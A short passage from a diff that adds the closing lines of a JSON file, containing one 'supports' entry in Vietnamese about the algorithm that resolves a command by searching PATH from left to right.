+          "supports": ["Thuật toán resolve command theo PATH left-to-right"]
+        }
+      ]
+    }
+  ]
+}
